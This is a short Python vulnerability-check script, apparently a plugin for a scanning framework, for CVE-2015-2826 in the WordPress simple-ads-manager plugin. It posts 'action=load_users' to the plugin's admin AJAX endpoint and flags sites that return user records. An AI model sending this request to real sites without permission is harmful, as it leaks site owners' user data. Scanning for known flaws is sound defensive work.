#!/usr/bin/env python
# -*- coding: utf-8 -*-
#by lkz
#wordpress simple-ads-manager Disclosing sensitive information (CVE-2015-2826)
#refer http://www.itas.vn/news/ITAS-Team-found-out-multiple-critical-vulnerabilities-in-Hakin9-IT-Security-Magazine-78.html?language=en
import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload ='wp-content/plugins/simple-ads-manager/sam-ajax-admin.php'
    url = arg + payload
    post_data = 'action=load_users'
    code, head, res, _,_ = curl.curl('-d %s %s' % (post_data,url))
    if code == 200 and 'recid' in res :
        security_info(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress','http://www.example.com/')[1])